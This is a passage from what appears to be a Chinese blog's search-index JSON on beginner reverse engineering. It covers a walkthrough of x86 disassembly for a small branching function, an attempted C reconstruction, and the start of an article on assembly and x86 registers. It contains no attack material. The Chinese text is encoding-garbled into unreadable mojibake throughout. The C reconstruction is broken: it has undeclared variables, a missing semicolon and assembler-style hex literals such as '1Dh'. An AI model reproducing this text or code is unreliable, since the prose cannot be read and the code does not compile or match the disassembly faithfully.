[ebp+var_4], 1 .text:000011D5 EB 34 jmp short loc_120B .text:000011D5 .text:000011D7 loc_11D7: .text:000011D7 83 7D 08 00 cmp [ebp+arg_0], 0 .text:000011DB 75 09 jnz short loc_11E6 .text:000011DB .text:000011DD C7 45 FC 02 00 00 00 mov [ebp+var_4], 2 .text:000011E4 EB 25 jmp short loc_120B .text:000011E4 .text:000011E6 loc_11E6: .text:000011E6 83 7D 08 1D cmp [ebp+arg_0], 1Dh .text:000011EA 7F 09 jg short loc_11F5 .text:000011EA .text:000011EC C7 45 FC 03 00 00 00 mov [ebp+var_4], 3 .text:000011F3 EB 16 jmp short loc_120B .text:000011F3 .text:000011F5 loc_11F5: .text:000011F5 83 7D 08 45 cmp [ebp+arg_0], 45h .text:000011F9 7F 09 jg short loc_1204 .text:000011F9 .text:000011FB C7 45 FC 04 00 00 00 mov [ebp+var_4], 4 .text:00001202 EB 07 jmp short loc_120B .text:00001202 .text:00001204 loc_1204: .text:00001204 C7 45 FC 05 00 00 00 mov [ebp+var_4], 5 .text:00001204 .text:0000120B loc_120B: .text:0000120B 8B 45 FC mov eax, [ebp+var_4] .text:0000120E C9 leave .text:0000120F C3 retn ;main .text:00001221 6A 3C push 3Ch .text:00001223 E8 85 FF FF FF call test1 .text:00001228 83 C4 04 add esp, 4 è¿™é‡Œåªè¦æˆ‘ä»¬åœ¨ç”»å †æ ˆå¹³è¡¡ä¸­ç”¨å¿ƒäº†ï¼Œçœ‹è¿™é‡Œä¹Ÿä¸ä¼šè´¹äº‹çš„ï¼Œé‡åˆ°ä¸å¸¸ç”¨çš„æŒ‡ä»¤æœç´¢å³å¯ã€‚ é¦–å…ˆæˆ‘è¿™é‡Œçš„æ€è·¯å°±æ˜¯å…ˆæ‰¾mainå‡½æ•°å…¥å£ï¼Œå¦‚ä¸Šå›¾æ‰€ç¤ºã€‚é‚£ç¬¬ä¸€æ­¥è¿™é‡Œæ˜¯push 3Chã€‚ä¹Ÿå°±æ˜¯3Chå…¥æ ˆï¼Œè¿™é‡Œçš„hä»£è¡¨åå…­è¿›åˆ¶è€Œå·²ã€‚ ä¹‹åcallæŒ‡ä»¤è°ƒç”¨test1å‡½æ•°ï¼Œé‚£æˆ‘ä»¬æ¥ä¸‹æ¥æ‰¾å¯»test1çš„å…¥å£ å¦‚ä¸Šå›¾ï¼Œå‰é¢ä¸¤ä¸ªæŒ‡ä»¤æˆ‘ä¸“é—¨é—®äº†ä¸€ä¸‹GPTï¼š var_4= dword ptr -4 arg_0= dword ptr 8 åœ¨æ±‡ç¼–è¯­è¨€ä¸­ï¼Œdword ptr è¡¨ç¤º â€œdouble word pointerâ€ï¼Œè¡¨ç¤ºä¸€ä¸ªåŒå­—ï¼ˆ32ä½ï¼‰æŒ‡é’ˆã€‚è€Œ -4 å’Œ 8 æ˜¯ç›¸å¯¹äºåŸºå€æŒ‡é’ˆ ebp çš„åç§»é‡ã€‚ var_4= dword ptr -4 è¡¨ç¤ºåœ¨å½“å‰å †æ ˆå¸§ä¸­ï¼Œvar_4 æ˜¯ä¸€ä¸ªåŒå­—ï¼ˆ32ä½ï¼‰å˜é‡ï¼Œç›¸å¯¹äºåŸºå€æŒ‡é’ˆ ebp çš„åç§»é‡ä¸º -4ã€‚è¿™æ„å‘³ç€åœ¨å †æ ˆä¸Šï¼Œvar_4 å­˜å‚¨åœ¨ ebp - 4 çš„ä½ç½®ã€‚ arg_0= dword ptr 8 è¡¨ç¤ºåœ¨å½“å‰å †æ ˆå¸§ä¸­ï¼Œarg_0 æ˜¯ä¸€ä¸ªåŒå­—ï¼ˆ32ä½ï¼‰å‚æ•°ï¼Œç›¸å¯¹äºåŸºå€æŒ‡é’ˆ ebp çš„åç§»é‡ä¸º 8ã€‚è¿™æ„å‘³ç€åœ¨å †æ ˆä¸Šï¼Œå‡½æ•°å‚æ•° arg_0 å­˜å‚¨åœ¨ ebp + 8 çš„ä½ç½®ã€‚ æ€»ä½“æ¥è¯´ï¼Œè¿™ä¸¤ä¸ªå®šä¹‰å‘Šè¯‰æˆ‘ä»¬åœ¨å‡½æ•°çš„å †æ ˆå¸§ä¸­å¦‚ä½•è®¿é—® var_4 å’Œ arg_0 è¿™ä¸¤ä¸ªå˜é‡ã€‚ åŸºäºä¸Šè¿°é˜è¿°ï¼Œæˆ‘ä»¬ä¸éš¾ç†è§£ï¼Œè¿™é‡Œçš„var_4ä¸arg_0çš„åœ°å€ä¸€å®šæ˜¯EBPå½“å‰çš„åœ°å€-4ä¸+8ã€‚ ä¹‹åçš„è¿™ä¸¤ä¸ªæ­¥éª¤æ„æ€æ˜¯ï¼Œå°†å½“å‰espçš„å€¼èµ‹å€¼ç»™ebpï¼Œä¹Ÿå°±æ˜¯è¯´æ­¤åˆ»ï¼Œebpï¼ˆä¹Ÿå°±æ˜¯æ ˆåº•ï¼‰å‡å°‘äº†ï¼Œå‡å°‘è‡³ä¸espä½ç½®ä¸€è‡´ã€‚ è€ŒsubæŒ‡ä»¤åˆ™æ˜¯è¿›è¡Œesp-10hçš„æ“ä½œï¼Œåœ¨è¿™é‡Œ10æ˜¯åå…­è¿›åˆ¶ï¼Œé‚£10è¿›åˆ¶å°±æ˜¯16ï¼Œä¹Ÿå°±æ˜¯å°†espè¿›è¡Œ-16ï¼Œé‚£åˆ°è¿™é‡Œebpä¸espä¾¿ä¸å†åŒä¸€ä½ç½®ï¼Œé‚£ä»–ä»¬ä¹‹é—´çš„è·ç¦»åˆ™æ˜¯ä¸ºäº†åœ¨ä¸‹é¢ç¨‹åºæ‰§è¡Œæ—¶ï¼Œåˆ†é…å†…å­˜ç©ºé—´çš„ä½œç”¨ï¼ˆè¿™é‡Œæˆ‘ä»¬åœ¨ä¸Šé¢å †æ ˆå›¾ä¹Ÿå­¦ä¹ è¿‡ï¼‰å³ç¼“å†²åŒºã€‚ æ¥ä¸‹æ¥çš„ è¿™é‡Œçš„æ„æ€æ˜¯ï¼Œå°†0èµ‹å€¼ç»™var_4ä¹Ÿå°±æ˜¯ebpåç§»é‡ä¸º-4çš„ä½ç½®ï¼Œå³æ­¤åˆ»var_4çš„å€¼ä¸º0 è¿™é‡Œæˆ‘ä»¬æœç´¢ä¸€ä¸‹cmpæŒ‡ä»¤çš„å«ä¹‰ï¼š cmpæ˜¯æ¯”è¾ƒæŒ‡ä»¤ï¼Œcmpçš„åŠŸèƒ½ç›¸å½“äºå‡æ³•æŒ‡ä»¤ï¼Œåªæ˜¯ä¸ä¿å­˜ç»“æœã€‚cmpæŒ‡ä»¤æ‰§è¡Œåï¼Œå°†å¯¹æ ‡å¿—å¯„å­˜å™¨äº§ç”Ÿå½±å“ã€‚å…¶ä»–ç›¸å…³æŒ‡ä»¤é€šè¿‡è¯†åˆ«è¿™äº›è¢«å½±å“çš„æ ‡å¿—å¯„å­˜å™¨ä½æ¥å¾—çŸ¥æ¯”è¾ƒç»“æœã€‚ cmp æŒ‡ä»¤æ ¼å¼ï¼š cmp æ“ä½œå¯¹è±¡1, æ“ä½œå¯¹è±¡2 åŠŸèƒ½ï¼š æ“ä½œå¯¹è±¡1 - æ“ä½œå¯¹è±¡2 è®¡ç®—æ“ä½œå¯¹è±¡1 - æ“ä½œå¯¹è±¡2ä½†å¹¶ä¸ä¿å­˜ç»“æœï¼Œä»…ä»…æ ¹æ®è®¡ç®—ç»“æœå¯¹æ ‡å¿—å¯„å­˜å™¨è¿›è¡Œè®¾ç½®ã€‚ ä¹Ÿå°±æ˜¯è¯´è¿™é‡Œçš„cmpæ˜¯å°†arg_0ä¸0è¿›è¡Œæ¯”è¾ƒ è¿™é‡Œæˆ‘ä»¬éœ€è¦ç»“åˆjnsæŒ‡ä»¤æ¥çœ‹ï¼Œå…ˆç†è§£ä¸€ä¸‹jnsæŒ‡ä»¤å«ä¹‰ï¼šè¿™é‡Œæˆ‘æ„Ÿè§‰æ˜¯å†™é”™äº†ï¼Œæœäº†å‡ ç¯‡æ–‡ç« å‘ç°jnsæ˜¯å½“éè´Ÿæ•°çš„æ—¶å€™å³å¯è·³è½¬ ä¹Ÿå°±æ˜¯è¯´å¦‚æœæˆ‘ä»¬arg_0&gt;=0ï¼ˆä¸ºéè´Ÿæ•°ï¼‰åˆ™æ‰§è¡Œä¸‹åˆ—çš„jnså‘½ä»¤è·³è½¬åˆ°jnsæ‰€æŒ‡å®šçš„ç›®æ ‡åœ°å€ä¸Šï¼Œå¦‚ä¸Šå›¾æ‰€ç¤ºä¹Ÿå°±æ˜¯11D7ä½ç½®ã€‚ è‹¥æˆ‘ä»¬çš„arg_0&lt;0ï¼Œé‚£var_4åˆ™ä¼šè¢«èµ‹å€¼ä¸º1ï¼Œä¹‹åç»§ç»­è·³è½¬åˆ°æŒ‡å®šä½ç½®ï¼š120Bï¼›è‹¥æˆ‘ä»¬æˆåŠŸæ‰§è¡ŒjnsæŒ‡ä»¤ï¼Œé‚£æˆ‘ä»¬åˆ™ä¼šç»§ç»­æ‰§è¡Œarg_0ä¸0çš„æ¯”è¾ƒ åœ¨jnzæŒ‡ä»¤ä½œç”¨ä¸‹ï¼Œå¦‚æœæˆ‘ä»¬çš„arg_0!=0ï¼Œåˆ™ä¼šè·³è½¬åˆ°æŒ‡å®šä½ç½®11E6ï¼Œå¦åˆ™var_4åˆ™ä¼šè¢«èµ‹å€¼ä¸º2ï¼Œæ¥ç€è·³è½¬åˆ°æŒ‡å®šä½ç½®ï¼š120Bï¼› åœ°å€11E6ï¼š å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œåœ¨11E6å¤„è¿›è¡Œäº†arg_0ä¸1Dhçš„æ¯”è¾ƒï¼Œ é‚£å¦‚æœæˆ‘ä»¬æ­¤æ—¶arg_0&gt;1Dhåˆ™ä¼šè·³è½¬åˆ°jgæŒ‡å®šä½ç½®ï¼š11F5ï¼Œå¦åˆ™å°†var_4èµ‹å€¼ä¸º3ï¼Œæ¥ç€è·³è½¬åˆ°120Bã€‚ è¿™é‡Œå‘¢åœ¨11F5å¤„ï¼Œä¾æ—§æ˜¯å¦‚æœarg_0&gt;45hï¼Œåˆ™è·³è½¬åˆ°æŒ‡å®šä½ç½®ï¼š1204ï¼Œå¦åˆ™å°†var_4èµ‹å€¼ä¸º4ï¼Œæ¥ç€è·³è½¬åˆ°120Bã€‚ æœ€ååœ¨1204åœ°å€å¤„ï¼Œç›´æ¥å°†var_4èµ‹å€¼ä¸º5ï¼Œæ¥ç€æ‰§è¡Œleaveï¼Œretnã€‚ è¿™é‡Œå‘¢é—®äº†GPTè¯´æ˜¯ï¼Œleaveä½œç”¨æ˜¯æ¢å¤å…ˆå‰çš„å †æ ˆå¸§ï¼Œretnåˆ™æ˜¯è¿”å›åˆ°å½“åˆcallæŒ‡ä»¤è°ƒç”¨åœ°å€å¤„ æœ€åadd espï¼Œ4ï¼Œä¹Ÿå°±æ˜¯esp=esp+4ï¼Œè¿™é‡Œä¹Ÿå°±æ˜¯ä¸ºäº†å°†ä½¿ç”¨è¿‡çš„å­—èŠ‚ï¼ˆå†…å­˜ç©ºé—´ï¼‰å…¨éƒ¨å›æ”¶ï¼Œæ¸…ç†å †æ ˆã€‚ ç»¼ä¸Šæ‰€è¿°ï¼Œæˆ‘ä»¬å°è¯•ç¼–å†™ä¸€æ³¢Cä»£ç ï¼š #include&lt;stdio.h&gt; int test1(int a){ int var_4 = 0 if(arg_0 &lt; 0){ var_4 = 1; } else if(arg_0 == 0){ var_4 = 2; }else if(arg_0 &lt;= 1Dh){ var_4 = 3; }else if(arg_4 &lt;= 45h){ var_4 = 4; }else{ var_4 = 5; } return var_4; } int main(){ test1(3Ch); return 0; } ä¸è¿‡ä¸åŸå‡½æ•°å¯¹æ¯”å‘ç°ï¼Œè¿™é‡Œä¼¼ä¹å˜é‡çš„åå­—æˆ‘ä»¬æ— æ³•å¾—çŸ¥ï¼Œå¦å¤–å°±æ˜¯ 0x03 æ€»ç»“ è¿™æ¬¡å †æ ˆå¹³è¡¡èŠ±äº†ä¸‰å¤©æ—¶é—´ï¼Œä½†å‰ä¸¤å¤©å„ç§çäº‹ä»¥åŠè½¯ä»¶é…ç½®é—®é¢˜å¯¼è‡´æˆ‘è¿Ÿè¿Ÿæ²¡æœ‰å¼€å§‹ï¼Œä»Šæ™šå¥½ä¸å®¹æ˜“æœ‰äº†æ—¶é—´ï¼Œå°±èŠ±äº†2å°æ—¶å®Œæˆã€‚ æ€»çš„æ¥è¯´å›°éš¾ä¸æ˜¯å¾ˆå¤§ï¼ˆæˆ–è®¸æ˜¯æˆ‘è·Ÿç€æ•™ç¨‹èµ°çš„ç¼˜æ•…å§ï¼‰ä¸è¿‡è¿˜æ˜¯å¾ˆæœ‰æ”¶è·çš„ï¼Œå›é¡¾ä¹‹å‰å‘å¸ƒçš„æ±‡ç¼–æŒ‡ä»¤é‚£ä¸€ç¯‡æ–‡ç« ï¼Œäº†ä½ ç»™æˆ‘å¤´ç–¼ä¸å·²ï¼Œè™½ç„¶å¤§æ¦‚å¯ä»¥çœ‹æ‡‚ï¼Œä½†è¿˜æ˜¯ç¼ºäº†å¾ˆå¤šä¸œè¥¿ï¼Œè¿™å›ä¹Ÿæ˜¯åœ¨reverseæ–¹å‘å¸ˆå‚…çš„å»ºè®®ä¸‹ï¼Œå°è¯•ç”»å †æ ˆå›¾ï¼Œè¿™ä¼¼ä¹è®©æˆ‘æ”¶è·å¾ˆå¤§ã€‚ 0x04 å‚è€ƒæ–‡ç«  ç”»å †æ ˆå›¾1 é€†å‘å­¦ä¹ ä¹‹ç”»å †æ ˆå›¾ä¸€","tags":["reverseç³»åˆ—"],"categories":["reverse"]},{"title":"æ±‡ç¼–åŸºç¡€æŒ‡ä»¤","path":"/2023/11/19/hui-bian-ji-chu-zhi-ling/","content":"0x01 ä»€ä¹ˆæ˜¯æ±‡ç¼–è¯­è¨€ æ±‡ç¼–è¯­è¨€æ˜¯æœ€æ¥è¿‘æœºå™¨è¯­è¨€çš„ç¼–ç¨‹è¯­è¨€ï¼Œå¼•ç”¨ç™¾ç§‘ä¸­çš„ä¸€æ®µè¯è§£é‡Šä¸ºï¼š æ±‡ç¼–è¯­è¨€ï¼ˆassembly languageï¼‰æ˜¯ä¸€ç§ç”¨äºç”µå­è®¡ç®—æœºã€å¾®å¤„ç†å™¨ã€å¾®æ§åˆ¶å™¨æˆ–å…¶ä»–å¯ç¼–ç¨‹å™¨ä»¶çš„ä½çº§è¯­è¨€ï¼Œäº¦ç§°ä¸ºç¬¦å·è¯­è¨€ã€‚åœ¨æ±‡ç¼–è¯­è¨€ä¸­ï¼Œç”¨åŠ©è®°ç¬¦ä»£æ›¿æœºå™¨æŒ‡ä»¤çš„æ“ä½œç ï¼Œç”¨åœ°å€ç¬¦å·æˆ–æ ‡å·ä»£æ›¿æŒ‡ä»¤æˆ–æ“ä½œæ•°çš„åœ°å€ã€‚æ±‡ç¼–è¯­è¨€åˆè¢«ç§°ä¸ºç¬¬äºŒä»£è®¡ç®—æœºè¯­è¨€ã€‚ 1.1 æ±‡ç¼–è¯­è¨€äº§ç”Ÿçš„åŸå›  å¯¹äºç»å¤§å¤šæ•°äººæ¥è¯´ï¼ŒäºŒè¿›åˆ¶ç¨‹åºæ˜¯ä¸å¯è¯»çš„ï¼Œå½“ç„¶æœ‰èƒ½äººå¯ä»¥è¯»ï¼Œæ¯”å¦‚ç¬¬ä¸€ä»£ç¨‹åºå‘˜ï¼Œä½†è¿™ç±»äººå¿«ç­ç»äº†ï¼Œç›´æ¥çœ‹äºŒè¿›åˆ¶ä¸å®¹æ˜“çœ‹å‡ºæ¥ç©¶ç«Ÿåšäº†ä»€ä¹ˆäº‹æƒ…ï¼Œæ¯”å¦‚æœ€ç®€å•çš„åŠ æ³•æŒ‡ä»¤äºŒè¿›åˆ¶è¡¨ç¤ºä¸º 00000011ï¼Œå¦‚æœå®ƒæ··åœ¨ä¸€å¤§ä¸²01å­—ç¬¦ä¸²ä¸­å°±å¾ˆéš¾æŠŠå®ƒæ‰¾å‡ºæ¥ï¼Œæ‰€ä»¥æ±‡ç¼–è¯­è¨€ä¸»è¦å°±æ˜¯ä¸ºäº†è§£å†³äºŒè¿›åˆ¶ç¼–ç çš„å¯è¯»æ€§é—®é¢˜ã€‚ 1.2 æ±‡ç¼–ä¸äºŒè¿›åˆ¶çš„å…³ç³» æ¢å¥è¯æ¥è¯´ï¼Œæ±‡ç¼–è¯­è¨€å°±æ˜¯æŠŠç»™æœºå™¨çœ‹çš„äºŒè¿›åˆ¶ç¼–ç ç¿»è¯‘æˆäººè¯ï¼Œæ±‡ç¼–æŒ‡ä»¤æ˜¯æœºå™¨æŒ‡ä»¤çš„åŠ©è®°ç¬¦ï¼Œä¸æœºå™¨æŒ‡ä»¤æ˜¯ä¸€ä¸€å¯¹åº”çš„å…³ç³»ï¼Œæ˜¯ä¸€ç§ä¾¿äºé˜…è¯»å’Œè®°å¿†çš„ä¹¦å†™æ ¼å¼ã€‚æœ‰æ•ˆåœ°è§£å†³äº†æœºå™¨æŒ‡ä»¤ç¼–å†™ç¨‹åºéš¾åº¦å¤§çš„é—®é¢˜ï¼Œå¹¶ä¸”ä½¿ç”¨ç¼–è¯‘å™¨ï¼Œå¯ä»¥å¾ˆæ–¹ä¾¿çš„æŠŠæ±‡ç¼–ç¨‹åºè½¬è¯‘æˆæœºå™¨æŒ‡ä»¤ç¨‹åºï¼Œæ¯”å¦‚ä¹‹å‰æåˆ°çš„ 00000011 åŠ æ³•æŒ‡ä»¤ï¼Œå¯¹åº”çš„æ±‡ç¼–æŒ‡ä»¤æ˜¯ ADDï¼Œåœ¨è°ƒç”¨æ±‡ç¼–å™¨æ—¶å°±ä¼šæŠŠ ADD ç¿»è¯‘æˆ 00000011ã€‚ 0x02 å¯„å­˜å™¨ è¯´åˆ°æ±‡ç¼–æŒ‡ä»¤ä¸å¾—ä¸æåˆ°å¯„å­˜å™¨ï¼Œå¯„å­˜å™¨æœ¬èº«æ˜¯ç”¨æ¥å­˜æ•°æ®çš„ï¼Œå› ä¸º CPU æœ¬èº«åªè´Ÿè´£é€»è¾‘è¿ç®—ï¼Œæ•°æ®éœ€è¦å•ç‹¬å‚¨å­˜åœ¨å…¶ä»–çš„åœ°æ–¹ï¼Œä½†æ˜¯å¯¹äºä¸ç†Ÿæ‚‰å¯„å­˜å™¨çš„äººæ¥è¯´ä¼šæœ‰ç–‘æƒ‘ï¼Œæ•°æ®ä¸æ˜¯å­˜åœ¨ç¡¬ç›˜ä¸Šå—ï¼Ÿæˆ–è€…è¯´æ•°æ®ä¸æ˜¯å­˜åœ¨å†…å­˜ä¸­å—ï¼Ÿè¿™äº›æƒ³æ³•éƒ½æ²¡é”™ï¼Œé‚£ä¹ˆå¯„å­˜å™¨æ˜¯ç”¨æ¥åšä»€ä¹ˆçš„å‘¢ï¼Ÿ 2.1 å¯„å­˜å™¨ä½œç”¨ å…¶å®ç¡¬ç›˜ã€å†…å­˜éƒ½æ˜¯ç”¨æ¥å­˜å‚¨æ•°æ®çš„ï¼Œä½†æ˜¯ CPU çš„è¿ç®—é€Ÿåº¦è¿œé«˜äºå†…å­˜çš„è¯»å†™é€Ÿåº¦ï¼Œæ›´ä¸ç”¨è¯´ä»ç¡¬ç›˜ä¸Šå–æ•°æ®äº†ï¼Œæ‰€ä»¥ä¸ºäº†é¿å…è¢«æ‹–æ…¢é€Ÿåº¦å½±å“æ•ˆç‡ï¼ŒCPU éƒ½è‡ªå¸¦ä¸€çº§ç¼“å­˜å’ŒäºŒçº§ç¼“å­˜ï¼Œä¸€äº› CPU ç”šè‡³å¢åŠ äº†ä¸‰çº§ç¼“å­˜ï¼Œä»è¿™äº›ç¼“å­˜ä¸­è¯»å†™æ•°æ®è¦æ¯”å†…å­˜å¿«å¾ˆå¤šï¼Œä½†æ˜¯è¿˜æ˜¯æ— æ³•ä½¿ç”¨é£é€Ÿè¿è½¬çš„ CPUï¼Œæ‰€ä»¥æ‰ä¼šæœ‰å¯„å­˜å™¨çš„å­˜åœ¨ã€‚ å¯„å­˜å™¨ä¸æ˜¯åæ¥å¢åŠ çš„ï¼Œåœ¨æœ€åˆçš„è®¡ç®—ä¸­å°±å·²ç»è®¾è®¡å‡ºæ¥ï¼Œç›¸æ¯”è€Œè¨€ï¼Œå¤šçº§ç¼“å­˜å‡ºç°çš„æ›´æ™šä¸€äº›ï¼Œé€šå¸¸é‚£äº›æœ€é¢‘ç¹è¯»å†™çš„æ•°æ®éƒ½ä¼šè¢«æ”¾åœ¨å¯„å­˜å™¨é‡Œé¢ï¼ŒCPU ä¼˜å…ˆè¯»å†™å¯„å­˜å™¨ï¼Œå†é€šè¿‡å¯„å­˜å™¨ã€ç¼“å­˜è·Ÿå†…å­˜æ¥äº¤æ¢æ•°æ®ï¼Œè¾¾åˆ°ç¼“å†²çš„ç›®çš„ï¼Œå› ä¸ºå¯ä»¥é€šè¿‡åç§°è®¿é—®å¯„å­˜å™¨ï¼Œè¿™æ ·è®¿é—®é€Ÿåº¦æ˜¯æœ€å¿«çš„ï¼Œå› æ­¤ä¹Ÿè¢«ç§°ä¸ºé›¶çº§ç¼“å­˜ã€‚ 2.2 å­˜å–é€Ÿåº¦æ¯”è¾ƒ é€šè¿‡ä¸Šé¢çš„å™è¿°æˆ‘ä»¬å¯ä»¥çŸ¥é“å­˜å–é€Ÿåº¦ä»é«˜åˆ°ä½åˆ†åˆ«æ˜¯: å¯„å­˜å™¨ &gt; 1çº§ç¼“å­˜ &gt; 2çº§ç¼“å­˜ &gt; 3çº§ç¼“å­˜ &gt; å†…å­˜ &gt; ç¡¬ç›˜ï¼Œå…³äºå®ƒä»¬çš„å­˜å–é€Ÿåº¦ï¼Œä¸¾ä¸ªä¾‹å­å¾ˆå®¹æ˜“å°±èƒ½æ˜ç™½äº†ï¼Œæ¯”å¦‚æˆ‘ä»¬åšèœï¼ˆCPUå·¥ä½œï¼‰æ—¶ï¼Œå–æ‰‹ä¸­ï¼ˆå¯„å­˜å™¨ï¼‰æ­£æ‹¿ç€çš„è‚‰å’Œè”¬èœè‚¯å®šæ˜¯æœ€å¿«çš„ï¼Œå¦‚æœæ²¡æœ‰å°±éœ€è¦æŠŠæ¡ˆæ¿ä¸Šï¼ˆ1çº§ç¼“å­˜ï¼‰å¤„ç†å¥½çš„èœæ‹¿è¿‡æ¥ï¼Œå¦‚æœæ¡ˆæ¿ä¸Šæ²¡æœ‰å°±åœ¨æ›´è¿œä¸€ç‚¹çš„æ´—èœæ± ï¼ˆ2çº§ç¼“å­˜ï¼‰ä¸­æ‰¾ä¸€æ‰¾ï¼Œè¿˜æ²¡æ‰¾åˆ°çš„è¯å°±è¦åˆ°å†°ç®±ï¼ˆ3çº§ç¼“å­˜ï¼‰ä¸­çœ‹ä¸€çœ‹äº†ï¼Œè¿™æ—¶å‘ç°å®¶é‡ŒçœŸæ²¡æœ‰ï¼Œé‚£å»æ¥¼ä¸‹çš„èœåº—ï¼ˆå†…å­˜ï¼‰å»ä¹°ç‚¹å§ï¼Œè½¬äº†ä¸€åœˆå‘ç°æ²¡æœ‰æƒ³è¦çš„ï¼Œæœ€åè¿˜æ˜¯å¼€è½¦å»å†œè´¸å¸‚åœºï¼ˆç¡¬ç›˜ï¼‰ä¹°å§ã€‚ é€šè¿‡ä¸Šé¢è¿™ä¸ªä¾‹å­åº”è¯¥èƒ½æ˜ç™½å®ƒä»¬çš„é€Ÿåº¦å…³ç³»äº†ï¼Œæ—¢ç„¶ç¼“å­˜è¿™ä¹ˆå¿«ï¼Œä¸ºä»€ä¹ˆä¸ç”¨ç¼“å­˜ä»£æ›¿å†…å­˜ï¼Œæˆ–è€…å°†2ã€3çº§ç¼“å­˜éƒ½æ¢æˆ1çº§ç¼“å­˜å‘¢ï¼Ÿè¿™é‡Œè¾¹æœ‰ä¸€ä¸ªæˆæœ¬é—®é¢˜ï¼Œé€Ÿåº¦è¶Šå¿«å¯¹åº”ç€ä»·æ ¼è¶Šé«˜ï¼Œå¦‚æœä½ ä¹°è¿‡æœºæ¢°ç¡¬ç›˜å’Œå›ºæ€ç¡¬ç›˜åº”è¯¥å¾ˆå®¹æ˜“å°±ç†è§£äº†ã€‚ 2.3 å¯„å­˜å™¨åˆ†ç±» å¸¸ç”¨çš„ x86 CPU å¯„å­˜å™¨æœ‰8ä¸ªï¼šEAX ã€EBXã€ECXã€EDXã€EDIã€ESIã€EBPã€ESPï¼Œæ®è¯´ç°åœ¨å¯„å­˜å™¨æ€»æ•°å·²ç»è¶…è¿‡100ä¸ªäº†ï¼Œç­‰æˆ‘æ‰¾åˆ°ç›¸å…³èµ„æ–™å†æ¥è¡¥å……ï¼Œä¸Šé¢è¿™å‡ ä¸ªå¯„å­˜å™¨æ˜¯æœ€å¸¸ç”¨çš„ï¼Œè¿™äº›åå­—ä¹Ÿå¸¸å¸¸å‡ºç°åœ¨æ±‡ç¼–çš„ä»£ç ä¸­ã€‚ å…¶ä¸­AXã€BXã€CXã€DXæ˜¯é€šç”¨å¯„å­˜å™¨ï¼Œå­˜æ”¾ä¸€èˆ¬æ€§æ•°æ®ã€‚1ä¸ª16ä½å¯„å­˜å™¨å¯ä»¥å­˜å‚¨16ä½çš„æ•°æ®ã€‚ ä¸ºäº†å‘ä¸Šä¸€ä»£CPUå…¼å®¹ï¼Œè¿™4ä¸ªå¯„å­˜å™¨å¯ä»¥åˆ†ä¸ºAHã€ALï¼ŒBHã€BLï¼ŒCHã€CLï¼ŒDHã€DLã€‚ æˆ‘ä»¬å¸¸è¯´çš„32ä½ã€64ä½ CPU æ˜¯æŒ‡æ•°æ®æ€»çº¿çš„å®½åº¦æˆ–æ ¹æ•°ï¼Œè€Œå¯„å­˜å™¨æ˜¯æš‚å­˜æ•°æ®å’Œä¸­é—´ç»“æœçš„å•å…ƒï¼Œå› æ­¤å¯„å­˜å™¨çš„ä½æ•°ä¹Ÿå°±æ˜¯å¤„ç†æ•°æ®çš„é•¿åº¦ä¸æ•°æ®æ€»çº¿çš„æ ¹æ•°æ˜¯ç›¸åŒçš„ï¼Œæ‰€ä»¥32ä½ CPU å¯¹åº”çš„å¯„å­˜å™¨ä¹Ÿåº”è¯¥æ˜¯32ä½çš„ã€‚ 2.4 å¸¸ç”¨å¯„å­˜å™¨ç”¨é€” ä¸Šé¢æåˆ°å¤§8ä¸ªå¯„å­˜å™¨éƒ½æœ‰å…¶ç‰¹å®šçš„ç”¨é€”ï¼Œæˆ‘ä»¬ä»¥32ä½ CPU ä¸ºä¾‹ç®€å•è¯´æ˜ä¸‹è¿™äº›å¯„å­˜å™¨çš„ä½œç”¨ï¼Œæ•´ç†å¦‚ä¸‹è¡¨ï¼š å¯„å­˜å™¨ å«ä¹‰ ç”¨é€” åŒ…å«å¯„å­˜å™¨ EAX ç´¯åŠ (Accumulator)å¯„å­˜å™¨ å¸¸ç”¨äºä¹˜ã€é™¤æ³•å’Œå‡½æ•°è¿”å›å€¼ AX(AHã€AL) EBX åŸºå€(Base)å¯„å­˜å™¨ å¸¸åšå†…å­˜æ•°æ®çš„æŒ‡é’ˆ, æˆ–è€…è¯´å¸¸ä»¥å®ƒä¸ºåŸºå€æ¥è®¿é—®å†…å­˜. BX(BHã€BL) ECX è®¡æ•°å™¨(Counter)å¯„å­˜å™¨ å¸¸åšå­—ç¬¦ä¸²å’Œå¾ªç¯æ“ä½œä¸­çš„è®¡æ•°å™¨ CX(CHã€CL) EDX æ•°æ®(Data)å¯„å­˜å™¨ å¸¸ç”¨äºä¹˜ã€é™¤æ³•å’Œ I/O æŒ‡é’ˆ DX(DHã€DL) ESI æ¥æºç´¢å¼•(Source Index)å¯„å­˜å™¨ å¸¸åšå†…å­˜æ•°æ®æŒ‡é’ˆå’Œæºå­—ç¬¦ä¸²æŒ‡é’ˆ SI EDI ç›®çš„ç´¢å¼•(Destination Index)å¯„å­˜å™¨ å¸¸åšå†…å­˜æ•°æ®æŒ‡é’ˆå’Œç›®çš„å­—ç¬¦ä¸²æŒ‡é’ˆ DI ESP å †æ ˆæŒ‡é’ˆ(Stack Point)å¯„å­˜å™¨ åªåšå †æ ˆçš„æ ˆé¡¶æŒ‡é’ˆ; ä¸èƒ½ç”¨äºç®—æœ¯è¿ç®—ä¸æ•°æ®ä¼ é€ SP EBP åŸºå€æŒ‡é’ˆ(Base Point)å¯„å­˜å™¨ åªåšå †æ ˆæŒ‡é’ˆ, å¯ä»¥è®¿é—®å †æ ˆå†…ä»»æ„åœ°å€, ç»å¸¸ç”¨äºä¸­è½¬ ESP ä¸­çš„æ•°æ®, ä¹Ÿå¸¸ä»¥å®ƒä¸ºåŸºå€æ¥è®¿é—®å †æ ˆ; ä¸èƒ½ç”¨äºç®—æœ¯è¿ç®—ä¸æ•°æ®ä¼ é€ BP 2.5 å¯„å­˜å™¨EAXã€AXã€AHã€ALçš„å…³ç³» åœ¨ä¸Šé¢çš„å›¾æ ‡ä¸­æ¯ä¸ªå¸¸ç”¨å¯„å­˜å™¨åé¢è¿˜æœ‰å…¶ä»–çš„åå­—ï¼Œå®ƒä»¬æ˜¯åŒä¸€ä¸ªå¯„å­˜å™¨ä¸åŒç”¨æ³•ä¸‹çš„ä¸åŒåå­—ï¼Œæ¯”å¦‚åœ¨32ä½ CPU ä¸Šï¼ŒEAXæ˜¯32ä½çš„å¯„å­˜å™¨ï¼Œè€ŒAXæ˜¯EAXçš„ä½16ä½ï¼ŒAHæ˜¯AXçš„é«˜8ä½ï¼Œè€ŒALæ˜¯AXçš„ä½8ä½ï¼Œå®ƒä»¬çš„å¯¹ç…§å…³ç³»å¦‚ä¸‹: 00000000 00000000 00000000 00000000 |===============EAX===============|---4ä¸ªå­—èŠ‚ |======AX=======|---2ä¸ªå­—èŠ‚ 